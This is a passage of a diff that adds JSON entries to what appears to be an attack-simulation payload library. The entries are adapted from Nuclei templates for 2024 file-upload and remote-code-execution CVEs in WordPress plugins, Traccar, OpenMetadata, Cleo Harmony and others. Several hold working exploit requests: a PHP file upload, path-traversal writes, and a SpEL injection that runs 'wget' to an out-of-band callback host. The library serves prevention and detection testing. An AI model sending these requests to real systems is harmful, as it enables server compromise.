+    "web_request_url": "/Tool/uploadfile.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundarywnsogfin"
+      },
+      {
+        "name": "Accept-Encoding",
+        "value": "gzip, deflate, br"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundarywnsogfin\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"contents.php\"\nContent-Type: application/octet-stream\n\n<?php print({{rand_int(800000, 999999)}}*{{rand_int(800000, 999999)}}); ?>\n------WebKitFormBoundarywnsogfin\nContent-Disposition: form-data; name=\"txt_path\"\n\n/home/{{to_lower(rand_text_alpha(5))}}.php\n------WebKitFormBoundarywnsogfin--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Intel Neural Compressor <2.5.0 - SQL Injection (Nuclei: CVE-2024-22476)",
+    "payload_external_id": "B8-UPLOAD-040",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-22476 by ritikchaddha] Improper input validation in some Intel(R) Neural Compressor software before version 2.5.0 may allow an unauthenticated user to potentially enable escalation of privilege via remote access.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/task/submit/",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/json"
+      }
+    ],
+    "web_request_body": "{\"script_url\": \"https://github.com/huggingface/transformers/blob/v4.21-release/examples/pytorch/text-classification/run_glue.py\",\"optimized\": \"False\",\"arguments\": [\"--model_name_or_path bert-base-cased --task_name mrpc --do_eval --output_dir result\"],\"approach\": \"static\",\"requirements\": [],\"workers\": 1}",
+    "web_request_body_type": "json",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "status\":\"successfully|Task\\ submitted\\ successfully"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Traccar - Unrestricted File Upload (Nuclei: CVE-2024-24809)",
+    "payload_external_id": "B8-UPLOAD-041",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-24809 by DhiyaneshDK] Traccar is an open source GPS tracking system. Versions prior to 6.0 are vulnerable to path traversal and unrestricted upload of file with dangerous type. Since the system allows registration by default, attackers can acquire ordinary user permissions by registering an account and exploit this vu...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/{{filename}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "InstaWP Connect <= 0.1.0.22 - Unauthenticated Arbitrary File Upload (Nuclei: CVE-2024-2667)",
+    "payload_external_id": "B8-UPLOAD-042",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-2667 by DhiyaneshDK] The InstaWP Connect – 1-click WP Staging & Migration plugin for WordPress is vulnerable to arbitrary file uploads due to  insufficient file validation in the /wp-json/instawp-connect/v1/config REST API endpoint in all versions up to, and including, 0.1.0.22. This makes it possible for unauthentic...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/?rest_route=/instawp-connect/v1/config",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "api_key={{randstr}}&override_plugin_zip=http://{{interactsh-url}}",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\"status\":true|\"message\":"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "SOPlanning - Remote Code Execution (Nuclei: CVE-2024-27115)",
+    "payload_external_id": "B8-UPLOAD-043",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-27115 by soonghee2@ajou.ac.kr] Detects a remote code execution vulnerability in SOPlanning version 1.52.01 through authenticated PHP file upload.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/process/login.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "login={{username}}&password={{password}}",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "OpenMetaData - SpEL Injection in PUT /api/v1/policies (Nuclei: CVE-2024-28253)",
+    "payload_external_id": "B8-UPLOAD-044",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-28253 by daffainfo] OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. `CompiledRule::validateExpression` is also called from `PolicyRepository.prepare`. `prepare()` is called from `EntityReposit...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "PUT",
+    "web_request_url": "/api/v1/policies",
+    "web_request_headers": [
+      {
+        "name": "Authorization",
+        "value": "Bearer {{accessToken}}"
+      },
+      {
+        "name": "Content-Type",
+        "value": "application/json"
+      }
+    ],
+    "web_request_body": "{\"name\":\"{{randstr}}\",\"rules\":[{\"name\":\"{{randstr}}\",\"description\":\"{{randstr}}\",\"effect\":\"deny\",\"operations\":[\"All\"],\"resources\":[\"All\"],\"condition\":\"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('{{base64(\"wget http://{{interactsh-url}}\")}}')))\"}]}",
+    "web_request_body_type": "json",
+    "expected_status_codes": [
+      400
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "LG LED Assistant - Thumbnail Path Traversal File Upload (Nuclei: CVE-2024-2863)",
+    "payload_external_id": "B8-UPLOAD-045",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-2863 by beginee] A path traversal vulnerability exists in the endpoint handler for /api/thumbnail in Common.js. An unauthenticated remote attacker can exploit this to upload arbitrary files to any location on the disk drive where the product is installed.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/api/thumbnail",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "fileName=/../../../../../../Users/Public/poc_test.txt&fileStr=bWFsaWNpb3VzIGNvbnRlbnQ%3d",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "VvvebJs < 1.7.5 - Arbitrary File Upload (Nuclei: CVE-2024-29272)",
+    "payload_external_id": "B8-UPLOAD-046",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-29272 by s4e-io] Arbitrary File Upload vulnerability in VvvebJs before version 1.7.5, allows unauthenticated remote attackers to execute arbitrary code and obtain sensitive information via the sanitizeFileName parameter in save.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/demo/landing/index.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "CodiMD <2.5.4 - Insecure Filename Randomization (Nuclei: CVE-2024-38353)",
+    "payload_external_id": "B8-UPLOAD-047",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-38353 by denandz,PulseSecurity.co.nz] CodiMD does not require valid authentication to access uploaded images or to upload new image data. An attacker who can determine an uploaded image's URL can gain unauthorised access to uploaded image data. Due to the insecure random filename generation in the underlying Formidable library, an at...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/uploadimage",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=---------------------------92633278134516118923780781161"
+      }
+    ],
+    "web_request_body": "-----------------------------92633278134516118923780781161\nContent-Disposition: form-data; name=\"image\"; filename=\"{{to_lower(rand_text_alpha(5))}}.gif\"\nContent-Type: image/gif\n\n{{base64_decode(\"R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\")}}\n-----------------------------92633278134516118923780781161--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\"link\":\"/uploads/[a-z0-9]{25,25}.gif\""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "BerqWP <= 1.7.6 - Arbitrary File Upload (Nuclei: CVE-2024-43160)",
+    "payload_external_id": "B8-UPLOAD-048",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-43160 by s4e-io] The BerqWP Automated All-In-One PageSpeed Optimization Plugin for Core Web Vitals, Cache, CDN, Images, CSS, and JavaScript plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the /api/store_webp.php file in all versions up to, and including, 1.7.6. ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/{{rand_base(12)}}.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Qualitor <= 8.24 - Remote Code Execution (Nuclei: CVE-2024-44849)",
+    "payload_external_id": "B8-UPLOAD-049",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-44849 by s4e-io] Qualitor up to 8.24 is vulnerable to Remote Code Execution (RCE) via Arbitrary File Upload in checkAcesso.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/html/ad/adfilestorage/request/{{rand_base(12)}}.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Camaleon CMS < 2.8.1 Arbitrary File Write to RCE (Nuclei: CVE-2024-46986)",
+    "payload_external_id": "B8-UPLOAD-050",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-46986 by iamnoooob,rootxharsh,pdresearch] An arbitrary file write vulnerability accessible via the upload method of the MediaController allows authenticated users to write arbitrary files to any location on the web server Camaleon CMS is running on (depending on the permissions of the underlying filesystem). E.g. This can lead to a remot...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/admin/media/upload?actions=false",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data;boundary=----WebKitFormBoundarynJs8ffRP2MgQXiF8"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundarynJs8ffRP2MgQXiF8\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"restart.txt\"\nContent-Type: text/x-ruby-script\n\n{{randstr}}\n------WebKitFormBoundarynJs8ffRP2MgQXiF8\nContent-Disposition: form-data; name=\"folder\"\n\n../../../tmp/\n------WebKitFormBoundarynJs8ffRP2MgQXiF8\nContent-Disposition: form-data; name=\"skip_auto_crop\"\n\ntrue\n------WebKitFormBoundarynJs8ffRP2MgQXiF8--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\"name\":\"restart\\.txt\",\"folder_path\":\"\\.\\./\\.\\./\\.\\./tmp\""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Hash Form <= 1.1.0 - Arbitrary File Upload (Nuclei: CVE-2024-5084)",
+    "payload_external_id": "B8-UPLOAD-051",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-5084 by s4e-io] The Hash Form Drag & Drop Form Builder plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the 'file_upload_action' function in all versions up to, and including, 1.1.0. This makes it possible for unauthenticated attackers to upload arbitrary files ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "",
+    "web_request_body_type": "form",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "DevDojo Voyager <= 1.8.0 - Arbitrary File Write vulnerability (Nuclei: CVE-2024-55417)",
+    "payload_external_id": "B8-UPLOAD-052",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-55417 by iamnoooob,rootxharsh,pdresearch] DevDojo Voyager through version 1.8.0 is vulnerable to bypassing the file type verification when an authenticated user uploads a file via /admin/media/upload. An authenticated user can upload a web shell causing arbitrary code execution on the server.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/storage/{{randstr}}.php?q={{base64('{{randstr}}')}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{randstr\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Cleo Harmony < 5.8.0.24 - File Upload Vulnerability (Nuclei: CVE-2024-55956)",
+    "payload_external_id": "B8-UPLOAD-053",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-55956 by iamnoooob,rootxharsh,pdresearch] In Cleo Harmony before 5.8.0.24, VLTrader before 5.8.0.24, and LexiCom before 5.8.0.24, an unauthenticated user can import and execute arbitrary Bash or PowerShell commands on the host system by leveraging the default settings of the Autorun directory.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/Synchronization",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/form-data;boundary=--------boundary"
+      },
+      {
+        "name": "VLSync",
+        "value": "Multipart;l=0,Acknowledge"
+      }
+    ],
+    "web_request_body": "VLSync: ReceivedReceipt;service=\"AS2\";msgId=12345;path=\"autorun/{{randstr_2}}.txt\";receiptfolder=Unspecified;\n--------boundary\n-i \"temp/{{randstr_1}}.tmp\"\n-r \"<6cad07d8-b297-4dea-b0ea-c6f0381e4167>efc76ba0-20ad-47cd-954c-cd5d5b46d33d@d7cc2490-03a9-48a8-8afd-bd7042cfdbd5\"",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Keydatas ≤ 2.5.2 - Arbitrary File Upload (Nuclei: CVE-2024-6220)",
+    "payload_external_id": "B8-UPLOAD-054",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-6220 by hnd3884] The Keydatas plugin for WordPress (known in Chinese as \"简数采集器\") is vulnerable to unrestricted file uploads due to missing file-type validation in the keydatas_downloadImages function in all versions up to and including 2.5.2. An unauthenticated attacker can upload arbitrary files to the server — ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/uploads/{{folder}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "<html><head></head><body>"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "User Profile Builder < 3.11.8 - File Upload (Nuclei: CVE-2024-6366)",
+    "payload_external_id": "B8-UPLOAD-055",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-6366 by s4e-io] The User Profile Builder WordPress plugin before 3.11.8 does not have proper authorisation, allowing unauthenticated users to upload media files via the async upload functionality of WP.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-admin/async-upload.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"wppb_upload\"\n\ntrue\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"meta_name\"\n\n{{to_lower(rand_text_alpha(12))}}.gif\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"_wpnonce\"\n\ne8\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"action\"\n\nupload-attachment\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"async-upload\"; filename=\"{{to_lower(rand_text_alpha(12))}}.gif\"\nContent-Type: image/jpeg\n\nGIF89a\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\"success\":true|\"id\"|\"uploadedTo\""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Samsung MagicINFO 9 Server 21.1050.0 - Remote Code Execution (Nuclei: CVE-2024-7399)",
+    "payload_external_id": "B8-UPLOAD-056",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-7399 by iamnoooob,pdresearch] Improper limitation of a pathname to a restricted directory vulnerability in Samsung MagicINFO 9 Server version before 21.1050 allows attackers to write arbitrary file as system authority.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/MagicInfo/{{randbase(6)}}.jsp?input={{urlencode(base64(input))}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\\{\\{input\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WooCommerce Ultimate Gift Card ≤ 2.6.0 - Arbitrary File Upload (Nuclei: CVE-2024-8425)",
+    "payload_external_id": "B8-UPLOAD-057",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-8425 by jsnv-dev] The WooCommerce Ultimate Gift Card plugin for WordPress is vulnerable to arbitrary file uploads due to insufficient file type validation in the 'mwb_wgm_preview_mail' and 'mwb_wgm_woocommerce_add_cart_item_data' functions in all versions up to, and including, 2.6.0. This makes it possible for una...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/uploads/mwb_browse/{{rand_base(7)}}.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\\{\\{file_content\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WP Time Capsule Plugin - Remote Code Execution (Nuclei: CVE-2024-8856)",
+    "payload_external_id": "B8-UPLOAD-058",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-8856 by iamnoooob,rootxharsh,pdresearch] The Backup and Staging by WP Time Capsule plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the the UploadHandler.php file and no direct file access prevention in all versions up to, and including, 1.22.21. This makes it possible for unauthenticat...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/files/{{randbase(2)}}.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{marker\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "GutenKit <= 2.1.0 - Arbitrary File Upload (Nuclei: CVE-2024-9234)",
+    "payload_external_id": "B8-UPLOAD-059",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-9234 by s4e-io] The GutenKit Page Builder Blocks, Patterns, and Templates for Gutenberg Block Editor plugin for WordPress is vulnerable to arbitrary file uploads due to a missing capability check on the install_and_activate_plugin_from_external() function (install-active-plugin REST API endpoint) in all versions...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
